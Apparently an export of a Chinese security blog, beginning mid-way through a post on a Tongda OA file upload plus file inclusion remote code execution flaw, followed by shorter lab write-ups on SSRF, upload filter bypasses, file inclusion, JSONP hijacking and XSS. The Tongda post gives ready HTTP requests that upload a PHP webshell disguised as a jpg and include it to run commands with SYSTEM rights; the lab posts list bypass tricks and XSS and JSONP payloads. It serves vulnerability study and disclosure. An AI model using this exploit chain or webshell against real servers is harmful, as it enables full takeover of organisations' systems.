<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_uploadable</span><span class="params">($FILE_NAME)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $POS = strrpos($FILE_NAME, <span class="string">'.'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $EXT_NAME = $FILE_NAME;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>, <span class="number">3</span>)) == <span class="string">'php'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $EXT_NAME = strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件包含部分</p>
<p>文件位于webroot\ispirit\interface\gateway.php，代码如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/conn.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_org.php'</span>;</span><br><span class="line"><span class="keyword">if</span> ($P != <span class="string">''</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[^a-z0-9;]+/i'</span>, $P)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> _(<span class="string">'非法参数'</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">'LOGIN_USER_ID'</span>] == <span class="string">''</span> || $_SESSION[<span class="string">'LOGIN_UID'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> _(<span class="string">'RELOGIN'</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">    $json = stripcslashes($json);</span><br><span class="line">    $json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line">    <span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">'data'</span>) &#123;</span><br><span class="line">            $val = (<span class="keyword">array</span>) $val;</span><br><span class="line">            <span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value) &#123;</span><br><span class="line">                $&#123;$keys&#125; = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">'url'</span>) &#123;</span><br><span class="line">            $url = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($url != <span class="string">''</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">'/'</span>) &#123;</span><br><span class="line">            $url = substr($url, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (strpos($url, <span class="string">'general/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'ispirit/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'module/'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include_once</span> $url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果这里不传递参数P为空，就以绕过前面一系列的检测，随后从json中获取url参数的值，只要 general/、ispirit/、module/ 在url内，直接包含 $url。那么就可以直接构造json={“url”:”../../general/../../attach/im/xxxx/xxxxxxxxxx.jpg”}。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">    $json = stripcslashes($json);</span><br><span class="line">    $json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line">    <span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">'data'</span>) &#123;</span><br><span class="line">            $val = (<span class="keyword">array</span>) $val;</span><br><span class="line">            <span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value) &#123;</span><br><span class="line">                $&#123;$keys&#125; = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">'url'</span>) &#123;</span><br><span class="line">            $url = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($url != <span class="string">''</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">'/'</span>) &#123;</span><br><span class="line">            $url = substr($url, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (strpos($url, <span class="string">'general/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'ispirit/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'module/'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include_once</span> $url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此文件上传结合文件包含可直接getshell，且因为通达OA以system权限运行，故shell权限为system。</p>
<h2 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2. 漏洞验证"></a>2. 漏洞验证</h2><h3 id="2-1-下载地址"><a href="#2-1-下载地址" class="headerlink" title="2.1 下载地址"></a>2.1 下载地址</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.tongda2000.com&#x2F;download&#x2F;down.php?VERSION&#x3D;2019&amp;code&#x3D;86d3V9EzrapwAKhPkxfbNZDsfB48gbFvbS0QYsUr%2FnNWNP2e5Fn%2F&amp;F&#x3D;baidu_natural&amp;K&#x3D;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-将下载的exe下载安装即可"><a href="#2-2-将下载的exe下载安装即可" class="headerlink" title="2.2 将下载的exe下载安装即可"></a>2.2 将下载的exe下载安装即可</h3><h3 id="2-3-在左下角开始找到通达网络办公进行服务启动。"><a href="#2-3-在左下角开始找到通达网络办公进行服务启动。" class="headerlink" title="2.3 在左下角开始找到通达网络办公进行服务启动。"></a>2.3 在左下角开始找到通达网络办公进行服务启动。</h3><p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200414232909365.png" alt="image-20200414232909365"></p>
<h3 id="2-4-启动完成后访问http-127-0-0-1即可访问首页（如果端口设置的是默认80）。"><a href="#2-4-启动完成后访问http-127-0-0-1即可访问首页（如果端口设置的是默认80）。" class="headerlink" title="2.4 启动完成后访问http://127.0.0.1即可访问首页（如果端口设置的是默认80）。"></a>2.4 启动完成后访问<a href="http://127.0.0.1即可访问首页（如果端口设置的是默认80）。" target="_blank" rel="noopener">http://127.0.0.1即可访问首页（如果端口设置的是默认80）。</a></h3><p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200414232935236.png" alt="image-20200414232935236"></p>
<h3 id="2-5-访问任意文件上传漏洞路径（这里的192-168-0-102是运行OA环境的虚拟机ip）。"><a href="#2-5-访问任意文件上传漏洞路径（这里的192-168-0-102是运行OA环境的虚拟机ip）。" class="headerlink" title="2.5 访问任意文件上传漏洞路径（这里的192.168.0.102是运行OA环境的虚拟机ip）。"></a>2.5 访问任意文件上传漏洞路径（这里的192.168.0.102是运行OA环境的虚拟机ip）。</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php &#x2F;&#x2F;文件上传漏洞路径</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200414233023289.png" alt="image-20200414233023289"></p>
<h3 id="2-6-burp抓包上传小马。"><a href="#2-6-burp抓包上传小马。" class="headerlink" title="2.6 burp抓包上传小马。"></a>2.6 burp抓包上传小马。</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ispirit/im/upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.0.102</span><br><span class="line"><span class="attribute">Content-Length</span>: 660</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=123</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="UPLOAD_MODE"</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="P"</span><br><span class="line"></span><br><span class="line"><span class="attribute">123</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="DEST_UID"</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="ATTACHMENT"; filename="jpg"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$command=$_POST['cmd'];</span><br><span class="line">$wsh = new COM('WScript.shell');</span><br><span class="line">$exec = $wsh-&gt;exec("cmd /c ".$command);</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200415001900306.png" alt="image-20200415001900306"></p>
<h3 id="2-7-上传的文件不在根目录所以，需要文件包含的漏洞包含该漏洞进行利用，使用Burp-Suite抓包发送，构造文件包含数据包并执行命令。"><a href="#2-7-上传的文件不在根目录所以，需要文件包含的漏洞包含该漏洞进行利用，使用Burp-Suite抓包发送，构造文件包含数据包并执行命令。" class="headerlink" title="2.7 上传的文件不在根目录所以，需要文件包含的漏洞包含该漏洞进行利用，使用Burp Suite抓包发送，构造文件包含数据包并执行命令。"></a>2.7 上传的文件不在根目录所以，需要文件包含的漏洞包含该漏洞进行利用，使用Burp Suite抓包发送，构造文件包含数据包并执行命令。</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ispirit&#x2F;interface&#x2F;gateway.php &#x2F;&#x2F;文件包含漏洞页面</span><br><span class="line">json&#x3D;&#123;&quot;url&quot;:&quot;..&#x2F;..&#x2F;general&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2004&#x2F;1210160293.jpg&quot;&#125;&amp;cmd&#x3D;whoami &#x2F;&#x2F;文件包含payload，文件名是上传后的返回包里的</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ispirit/interface/gateway.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.0.102</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 75</span><br><span class="line"></span><br><span class="line">json=&#123;"url":"../../general/../../attach/im/2004/1210160293.jpg"&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200415001943025.png" alt="image-20200415001943025"></p>
<h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3. 影响版本"></a>3. 影响版本</h2><p>V11版</p>
<p>2017版</p>
<p>2016版</p>
<p>2015版</p>
<p>2013版</p>
<p>2013增强版<br>文件包含漏洞只有2017和V11.3版本存在</p>
<h1 id="0x02-缓解措施"><a href="#0x02-缓解措施" class="headerlink" title="0x02 缓解措施"></a><strong>0x02 缓解措施</strong></h1><p>官方目前已发布更新的版本，升级OA到对应版本即可解决该漏洞风险。</p>
<p>官方更新链接 <a href>http://www.tongda2000.com/news/673.php</a></p>
<h1 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a><strong>0x03 参考资料</strong></h1><p>[1] <a href="https://github.com/jas502n/OA-tongda-RCE" target="_blank" rel="noopener">https://github.com/jas502n/OA-tongda-RCE</a></p>
<p>[2] <a href="https://blog.csdn.net/god_zzZ/article/details/105192808?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7]()" target="_blank" rel="noopener">https://blog.csdn.net/god_zzZ/article/details/105192808?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7]()</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF</title>
    <url>/2020/03/19/SSRF/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a><strong>0x00 漏洞简介</strong></h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p>
<p>首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。<br>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。</p>
<h1 id="0x01-ssrf用途"><a href="#0x01-ssrf用途" class="headerlink" title="0x01 ssrf用途"></a><strong>0x01 ssrf用途</strong></h1><p>1.内外网的端口和服务扫描<br>2.主机本地敏感数据的读取<br>3.内外网主机应用程序漏洞的利用<br>4.内外网Web站点漏洞的利用</p>
<h1 id="0x02-漏洞常见出没位置"><a href="#0x02-漏洞常见出没位置" class="headerlink" title="0x02 漏洞常见出没位置"></a><strong>0x02 漏洞常见出没位置</strong></h1><p>所有调外部资源的参数都有可能存在ssrf漏洞<br>1）分享：通过URL地址分享网页内容<br>2）转码服务<br>3）在线翻译<br>4）图片加载与下载：通过URL地址加载或下载图片<br>5）图片、文章收藏功能<br>6）未公开的api实现以及其他调用URL的功能<br>7）从URL关键字中寻找share、wap、url、link、src、source、target、u、3g<br>、isplay、sourceURl、imageURL、domain</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-任意文件上传"><a href="#0x00-任意文件上传" class="headerlink" title="0x00 任意文件上传"></a><strong>0x00 任意文件上传</strong></h1><p>这个就直接上传了 没任何说的<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318143903894.png" alt="image-20200318143903894"></p>
<h1 id="0x01-JS限制文件上传"><a href="#0x01-JS限制文件上传" class="headerlink" title="0x01 JS限制文件上传"></a><strong>0x01 JS限制文件上传</strong></h1><p>前端限制后缀名，上传jpg文件，拦包改后缀绕过</p>
<p>准备的马<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318144329558.png" alt="image-20200318144329558"></p>
<p>后缀改成jpg 上传拦包后再改回php</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318144912130.png" alt="image-20200318144912130"></p>
<p>成功落地</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318144925810.png" alt="image-20200318144925810"></p>
<h1 id="0x02-MIME限制文件上传"><a href="#0x02-MIME限制文件上传" class="headerlink" title="0x02 MIME限制文件上传"></a><strong>0x02 MIME限制文件上传</strong></h1><p>上传php文件，显示类型不正确，实际上MIME验证就是检测Content-type字段值的，直接更改上传数据包中的Content-type即可绕过</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318145307005.png" alt="image-20200318145307005"></p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318150138406.png" alt="image-20200318150138406"></p>
<h1 id="0x03-扩展名限制文件上传"><a href="#0x03-扩展名限制文件上传" class="headerlink" title="0x03 扩展名限制文件上传"></a><strong>0x03 扩展名限制文件上传</strong></h1><p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318151510536.png" alt="image-20200318151510536"></p>
<p>采用后端验证后缀名的方式，这个方式有很多，但是会有环境限制，实际环境中需要进行测试使用<br>服务端扩展名验证绕过方法：<br>1、找黑名单扩展名的漏网之鱼 - 比如上面就漏掉了 asa 和 cer 之类<br>2、可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>3、特别文件名构造 - 比如发送的 http 包里把文件名改成 help.asp. 或 help.asp_(下划线为空格)，这种命名方式在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改， 然后绕过验证后，会被 windows 系统自动去掉后面的点和空格。<br>4、IIS 或 nginx 文件名解析漏洞<br>比如 help.asp;.jpg 或 <a href="http://www.xx.com/help.jpg/2.php" target="_blank" rel="noopener">http://www.xx.com/help.jpg/2.php</a><br>这里注意网上所谓的 nginx 文件名解析漏洞实际上是 php-fpm 文件名解析漏洞，详见 <a href="http://www.cnbeta.com/articles/111752.htm" target="_blank" rel="noopener">http://www.cnbeta.com/articles/111752.htm</a><br>5、0x00 截断绕过 - 这个是基于一个组合逻辑漏洞造成的<br>6、双扩展名解析绕过攻击(1) - 基于 web 服务的解析逻辑<br>比如上传x.php.rar等文件<br>7、双扩展名解析绕过攻击(2) - 基于 web 服务的解析方式如果在 Apache 的 conf 里有这样一行配置<br>AddHandler php5-script .php<br>这时只要文件名里包含.php<br>即使文件名是 test2.php.jpg 也会以 php 来执行</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200319111729252.png" alt="image-20200319111729252"></p>
<p>测试上传功能前可以随便输入一些后缀 目的是测试目标是白名单还是黑名单</p>
<h1 id="0x04-内容限制文件上传"><a href="#0x04-内容限制文件上传" class="headerlink" title="0x04 内容限制文件上传"></a><strong>0x04 内容限制文件上传</strong></h1><p>文件上传过程中图像大小及相关信息检测，通常我们会使用getimagesize()函数，此函数会返回一个数组。</p>
<p>Array</p>
<p>(</p>
<p>​    [0] =&gt; 2573</p>
<p>​    [1] =&gt; 16188</p>
<p>​    [2] =&gt; 1</p>
<p>​    [3] =&gt; width=”2573” height=”16188”</p>
<p>​    [channels] =&gt; 3</p>
<p>​    [mime] =&gt; image/gif</p>
<p>)</p>
<p>使用getimagesize()函数检测，会判断文件是否是一个有效的图片文件，如果不是则会报错，我们可以使用文件头欺骗来绕过。<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200319112551251.png" alt="image-20200319112551251"></p>
<p>上传成功<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200319112649041.png" alt="image-20200319112649041"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-任意文件包含"><a href="#0x00-任意文件包含" class="headerlink" title="0x00 任意文件包含"></a><strong>0x00 任意文件包含</strong></h1><p>看源码知道有个txt.txt文件</p>
<p><a href="http://106.13.42.155:91/DoraBox-master/file_include/any_include.php?file=txt.txt&amp;submit=submit" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/file_include/any_include.php?file=txt.txt&amp;submit=submit</a></p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318100531321.png" alt="image-20200318100531321"></p>
<h1 id="0x01-目录限制文件包含"><a href="#0x01-目录限制文件包含" class="headerlink" title="0x01 目录限制文件包含"></a><strong>0x01 目录限制文件包含</strong></h1><p>看下源码 加了个./</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318104742941.png" alt="image-20200318104742941"></p>
<p>我们在看下网站目录<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318104837254.png" alt="image-20200318104837254"></p>
<p>随便输入一个1  可以看到执行的./1<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318105617002.png" alt="image-20200318105617002"><br>那么在当前目录下直接txt.txt 就构成了./txt.txt<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318141934213.png" alt="image-20200318141934213"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF</title>
    <url>/2020/03/17/CSRF/</url>
    <content><![CDATA[<h1 id="0x00-JSONP劫持"><a href="#0x00-JSONP劫持" class="headerlink" title="0x00 JSONP劫持"></a><strong>0x00 JSONP劫持</strong></h1><p>JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 <code>&lt;script&gt;&lt;/script&gt;</code>元素标签，远程调用 JSON 文件来实现数据传递。<br>当某网站听过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。<br>直接访问链接，页面返回json格式的数据。</p>
<p>目标可以看到页面包含了用户信息<br><img src="/2020/03/17/CSRF/image-20200317182038345.png" alt="image-20200317182038345"></p>
<p>那么劫持后应该是可以在其他域下获得受害者的json信息，下面构造一个劫持页面，将劫持的信息，alert出来</p>
<p>这是我们用到的代码 </p>
<!--jsonp.html-->

<script>function vulkey(data){alert(JSON.stringify(data));}</script>
<script src="http://http://106.13.42.155:91/DoraBox/csrf/jsonp.php?callback=vulkey"></script>

<p>效果<br><img src="/2020/03/17/CSRF/image-20200317190406561.png" alt="image-20200317190406561"></p>
<h1 id="0x01-CORS跨域资源读取"><a href="#0x01-CORS跨域资源读取" class="headerlink" title="0x01 CORS跨域资源读取"></a><strong>0x01 CORS跨域资源读取</strong></h1><p>跨源资源共享 (CORS) 定义了在一个域中加载的客户端 Web 应用程序与另一个域中的资源交互的方式,需要浏览器和服务器共同支持才能实现。<br>可以看到其源码就是Access-Control-Allow-*系列，这个就是CORS的配置<br><img src="/2020/03/17/CSRF/image-20200317192022257.png" alt="image-20200317192022257"></p>
<p>接下来构造页面获取信息<br><img src="/2020/03/17/CSRF/image-20200317200358860.png" alt="image-20200317200358860"></p>
<p>效果<br><img src="/2020/03/17/CSRF/image-20200317200411005.png" alt="image-20200317200411005"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站</title>
    <url>/2020/03/17/XSS%E8%B7%A8%E7%AB%99/</url>
    <content><![CDATA[<p>以DoraBox漏洞练习平台来进行本文的实验</p>
<p>项目地址：<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-XSS反射型"><a href="#0x00-XSS反射型" class="headerlink" title="0x00 XSS反射型"></a><strong>0x00 XSS反射型</strong></h1><p>xss反射型，输入的代码经过服务器端处理后返回页面，造成代码执行。<br><code>&lt;script&gt;alert(/reflect_xss/)&lt;/script&gt;</code></p>
<p><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317165346892.png" alt="image-20200317165346892"></p>
<p>这时候我们注意到页面先是返回了string(37) “ 然后执行了注入代码。<br>那么为什么会返回这个呢，我们看下源码<br>DoraBox\xxs\reflect_xss.php</p>
<p><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317165710937.png" alt="image-20200317165710937"></p>
<p><code>$p 创建了一个对象Func，方法是GET，参数是name，$p -&gt; con_html生成表单，也就是我们一开始看到的页面。</code><br><code>关键的是echo $p -&gt; con_function(&#39;var_dump&#39;,$name);，这里con_function是作者造的回调函数，作用是执行作者传参进去的内容，当相应的函数执行。</code><br><code>那么con_function(&#39;var_dump&#39;,$name) 的作用等价于var_dump($name)，var_dump在处理字符串的时候会以如下形式string(字符串长度) &quot;字符串内容&quot;。</code></p>
<h1 id="0x01-XSS-存储型"><a href="#0x01-XSS-存储型" class="headerlink" title="0x01 XSS 存储型"></a><strong>0x01 XSS 存储型</strong></h1><p>存储型xss作者设计的很有意思，采用直接向当前页面追加内容的方式实现的，也就是说，如果你测试很多次的话，这个页面会越来越大。<br>所以在name<code>输入框提交&lt;script&gt;alert(/reflect_xss/)&lt;/script&gt;</code>，再次刷新页面即可触发注入代码。</p>
<p><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317170930548.png" alt="image-20200317170930548"></p>
<h1 id="0x02-XSS-DOM型"><a href="#0x02-XSS-DOM型" class="headerlink" title="0x02 XSS DOM型"></a><strong>0x02 XSS DOM型</strong></h1><p>可以发送，xss代码执行后没有在源码显示出来，这可能就是DOM型xss的特点</p>
